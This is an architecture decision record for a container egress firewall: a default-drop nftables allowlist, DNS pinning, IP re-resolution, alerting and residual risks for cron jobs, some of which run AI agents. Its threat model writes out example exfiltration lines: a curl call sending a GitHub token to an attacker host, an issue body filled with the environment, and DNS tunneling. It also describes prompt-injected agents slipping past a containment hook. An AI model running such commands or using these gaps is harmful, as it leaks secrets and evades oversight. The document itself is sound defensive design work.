# ADR-052: Container egress firewall — DOCKER-USER default-drop allowlist

- **Status:** Accepted
- **Date:** 2026-06-09
- **Deciders:** Jean (operator), security-sentinel + architecture-strategist (deepen-plan review)
- **Relates to:** #5046 (Tier-2 umbrella), #5018 (PreToolUse containment hook), ADR-033 I7 (spawn-bash hook bypass), #5073 (content-blind residual / GHA isolation deferral)

## Context

Two cron populations inside the `soleur-web-platform` container need egress
containment:

- **4 live `spawn("bash")` crons** (content-publisher, content-vendor-drift,
  rule-prune, weekly-analytics) bypass the #5018 PreToolUse hook entirely
  (ADR-033 I7) — until this change they ran **uncontained**: a prompt-injected
  child process could `curl https://attacker/?d=$GH_TOKEN`.
- **Claude-eval crons** are contained by the hook, but relaxing the hook's
  `Task`/`Skill` catch-all (required to restore the audit crons) is only safe
  with a network-layer backstop.

A HOST-level egress firewall is off the table: host OUTPUT carries the
cloudflared tunnel (all app traffic + the CI-deploy SSH route, #4829), Vector→
Better Stack, GHCR pulls, and apt — a default-drop there is a full outage.

## Decision

A **default-drop nftables egress allowlist scoped to the default Docker
bridge**, applied in the `DOCKER-USER` chain (table `ip filter`):

1. All soleur rules live in our own `SOLEUR-EGRESS` chain; `DOCKER-USER`
   carries exactly one `iifname "docker0" jump SOLEUR-EGRESS` rule. Docker
   never flushes `DOCKER-USER`, so the jump survives dockerd restarts;
   `cron-egress-firewall.service` (boot-persistent oneshot, the
   `docker_seccomp_config` pattern) re-asserts after reboots.
2. Rule order (first-match-wins, drop LAST): established/related accept →
   intra-bridge accept → DNS pinned to the container's own resolvers
   (UDP+TCP 53; off-pin queries are logged `egress-dns-exfil:` and dropped)
   → host-gateway :8288 accept (self-hosted Inngest; belt-and-braces — that
   path traverses INPUT, not FORWARD) → `@soleur_egress_allow` accept →
   `egress-blocked:` log + drop.
3. The allowlist is **grep-enumerated from runtime code, never intuited**
   (`cron-egress-allowlist.txt`, one evidence comment per host). Because the
   firewall scopes the WHOLE container — the Next.js app included — the list
   carries app-egress hosts the cron-centric framing missed: Resend,
   Buttondown, Cloudflare API, Stripe, Hetzner, the three browser push
   services, and the first-party canary targets (soleur.ai, app.soleur.ai,
   api.soleur.ai — live plain-fetch crons dial them THROUGH the firewall).
   Dynamic hosts (Sentry ingest, Supabase) resolve from the doppler env at
   timer run; an expected-but-absent env var forces the tick additive-only
   (a Doppler rename must never prune the live Supabase IPs).
4. **Re-resolve over SNI proxy.** A host-side systemd timer
   (`cron-egress-resolve.timer`, 1 min — the window IS the user-facing blast
   radius of an IP rotation) re-resolves hostnames → IPs: additive-then-prune
   in one atomic `nft -f` transaction, fail-safe on empty resolution,
   additive-only when any host fails to resolve. The resolved set UNIONS the
   host's view with the container's own `getent` view (one `docker exec` per
   tick) — CDN/geo answers diverge per resolver, and the container's answers
   are the IPs it will actually dial. Each tick also re-asserts the
   DOCKER-USER jump + default-drop and re-runs the loader when absent
   (self-heal: a mid-life `nft flush` must not fail open silently). An SNI
   proxy was rejected as a standing SPOF (proxy dies → all crons dark); the
   IP-rotation race is fail-loud/self-correcting (block → Sentry
   `egress_blocked` + missed heartbeat). Escalate to a proxy only on observed
   production churn.
   - **Amendment (2026-06-16, grace-window retention).** Observed production
     churn arrived: LB-fronted allowlisted hosts (Cloudflare/AWS/Google) rotate
     across pools far larger than a single tick's A-record snapshot, so a
     freshly-rotated IP was default-dropped before the next tick captured it —
     the non-GitHub analogue of incident 5516336, and a multi-day outage of the
     six heavy eval crons (missed, not failed, check-ins). The chosen escalation
     is NOT the rejected SNI proxy: the resolver now **retains** every IP it has
     observed DNS return for an already-allowlisted host over a rolling window
     (`GRACE_WINDOW_SECS`, default 24h) in a persistent `StateDirectory`-backed
     store, so the allow set accumulates each host's full rotation pool. This
     stays inside the default-drop boundary — only IPs DNS actually returned for
     an already-trusted host, never wholesale provider CIDRs — and preserves
     every invariant above (atomic add-then-prune, fail-safe-on-empty, additive-
     only on partial failure; eviction of past-window IPs is gated on the prune
     tick). Cost: a rotated-away IP stays allowlisted up to one window (~1min →
     ~24h), a bounded extension of the accepted CDN shared-IP residual. Runbook:
     `cron-egress-blocked.md` §"LB-rotation IP-coverage gap".
   - **Amendment (2026-06-29, intended drops are expected; recovery criterion is
     per-host, not DST-IP — #5676).** Some `egress-blocked` drops are deliberate
     and permanent: bare `npx` (cron-ux-audit's Playwright MCP) performs a
     spawn-time registry-metadata dial to `registry.npmjs.org` that the firewall
     CORRECTLY drops, because #5199 keeps `registry.npmjs.org` OFF the allowlist
     so `@playwright/mcp` resolves to the image-baked dep instead of a runtime
     supply-chain fetch. These drops are the control working as designed, NOT an
     allowlist gap. Two consequences are pinned here:
     1. **Recovery/health criteria exclude intended drops and are expressed
        PER-IDENTIFIED-HOST, never as a raw `egress-blocked` DST-IP/range
        threshold.** A "104.x hits → zero" criterion is unsatisfiable because the
        single `op=egress_blocked` issue conflates intended npm probes with
        genuine gaps. Intended drops are silenced **at source**
        (`npm_config_prefer_offline` on the cron-spawned npx, #5676), so npx uses
        the baked `_cacache` and skips the dial when cache-warm — without
        widening the allowlist.
     2. **Emitter-level DST-IP/range suppression of intended drops is REJECTED.**
        `registry.npmjs.org` rides Cloudflare's shared anycast `104.16.0.0/13`;
        any IP/range exclusion that muted the npm drop would simultaneously mask a
        genuine future allowlist gap to ANOTHER Cloudflare-fronted host — i.e. it
        would self-blind exactly the Branch-A gap class this firewall exists to
        catch. Intended drops are therefore removed by silencing the dialer, never
        by filtering the detector. Do NOT allowlist `registry.npmjs.org` (reverses
        #5199) and do NOT add a provider CIDR (reverses the 2026-06-16 amendment's
        no-wholesale-CIDR boundary).
5. **Fail-loud, three channels:** kernel drops — BOTH `egress-blocked:` and
   `egress-dns-exfil:` prefixes — are counted each tick and posted as a
   Sentry error event (`feature=cron-egress-firewall`, `op=egress_blocked` →
   paging issue alert, with a remediation pointer in `extra`); the resolve
   timer posts a Sentry Crons check-in (dead timer = missed check-in);
   `OnFailure=` fires a Sentry error check-in + Resend email (30-min
   cooldown). The kernel log lines themselves do NOT ship to Better Stack
   (Vector's journald sources are priority/unit-scoped) — the Sentry event
   is the no-SSH channel for drop forensics. Runbook:
   `knowledge-base/engineering/operations/runbooks/cron-egress-blocked.md`.
6. **Availability over containment at bootstrap:** the loader populates the
   allowlist sets BEFORE installing the default-drop; if resolution fails it
   aborts (fail-open) and alarms rather than blackholing the app.
7. **Apply path:** a new SSH `terraform_data "cron_egress_firewall"`
   provisioner (hashes of all 8 artifacts + `server_id` in
   `triggers_replace`), targeted in the apply workflow's SSH block. Post-apply
   asserts include a **live positive+negative container probe** — `nft -f`
   exits 0 on an inert ruleset, so only the probe proves enforcement.

## Consequences

- The 4 spawn-bash crons can no longer reach arbitrary hosts; the #5018 hook's
  `Task`/`Skill` relax-minimal (PR-2 Phase 2.A) gains its network backstop.
- **Content-blind residual (named honestly):** the firewall severs
  OFF-allowlist egress only. A compromised spawn-cron can still
  `gh issue create --body "$(env)"` to the public repo over allowlisted
  `api.github.com`. The #5018 hook remains the secret-in-context severance for
  claude-eval crons; for the spawn-bash 4, GHA isolation (#5073) is the layer
  that would close this. Bounded to single-user incident by the repo-scoped
  narrowed token.
- **DNS-tunnel residual (named honestly):** the pin blocks dialing an
  arbitrary resolver, NOT tunneling *through* the pinned resolver — a
  compromised spawn-cron can still encode bytes into
  `<base32>.attacker.com` labels that the legitimate recursive resolver
  delivers to the attacker's authoritative NS. Low-bandwidth, logged
  (every off-pin attempt) but the on-pin channel is open; closing it needs
  a filtering resolver (same #5073 evidence-gated escalation class).
- **CDN shared-IP broadening (named honestly):** acceptance is by
  destination IPv4 with no SNI/Host filtering, and several allowlisted
  hosts are CDN-fronted on shared anycast ranges (Fastly for github.com,
  Cloudflare for discord.com, etc.) — the truly reachable host set is
  therefore larger than the named list (any host co-resident on an
  allowlisted CDN IP). Similarly, an allowlisted IP serving DoH is
  reachable on 443 regardless of the port-53 pin. Both concentrate on the
  4 spawn-bash crons (claude-eval crons keep the hook's secret-read
  severance); an SNI-aware proxy is the escalation if evidence demands it.
- Adding a new external dependency to the app now requires an allowlist edit
  (`cron-egress-allowlist.txt`) — enforced fail-loud by the `egress_blocked`
  alert, guarded by `cron-egress-firewall.test.sh`.
- IPv6 is asserted OFF on the default bridge (a v6-enabled bridge would bypass
  the v4 ruleset); the loader hard-fails otherwise.
- Edge/WNS web-push endpoints are wildcard-only and NOT allowlisted — Edge
  push degrades fail-loud via the webpush error path (accepted residual).

## AP compliance

- **AP-001 (Terraform-only infrastructure provisioning):** upheld — the
  firewall lands via `terraform_data.cron_egress_firewall` in the existing
  `apps/web-platform/infra/` root; no out-of-band provisioning. No new
  standing service either: systemd oneshot + timer, no proxy daemon.
- **AP-002 (no SSH state mutation):** advisory-tier exception, consistent
  with the 8 sanctioned SSH-provisioner siblings (the `docker_seccomp_config`
  class) — SSH is the terraform-driven apply transport, not ad-hoc mutation.
